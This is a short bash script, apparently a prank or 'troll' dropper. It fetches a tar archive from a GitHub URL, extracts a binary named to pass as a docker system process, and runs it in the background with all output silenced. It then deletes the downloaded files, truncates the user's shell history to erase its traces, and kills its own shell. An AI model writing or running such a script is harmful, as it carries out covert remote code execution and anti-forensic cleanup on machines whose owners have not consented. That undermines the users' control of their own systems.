#!/bin/bash

# ---------------------------- VARIABLES ---------------------------- #
init_tempo=10 tempo=3 volume=30 tempo_offset=2 volume_offset=20
# ------------------------------------------------------------------- #

dir=/tmp/ ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
#curl 'nom de domaine' -o /tmp/$dir/proutsh42.tar
curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o $dir/proutsh42.tar
tar -xvf $dir/proutsh42.tar -C $dir
chmod 777 ./__dockersystem64
#chmod 777 ./prout_troll
cd $dir
#chmod last modif time of all files
(nohup ./__dockersytem64 $init_tempo $tempo $tempo_offset $volume $volume_offset &> /dev/null &)
#(nohup ./prout_troll &> /dev/null &)
rm -rf $dir/proutsh42.tar $dir/__dockersystem64 $dir/prout_troll
(truncate -s -100 ~/.zsh_history &> /dev/null &)
(truncate -s -100 ~/.bash_history &> /dev/null &)
kill -KILL $$
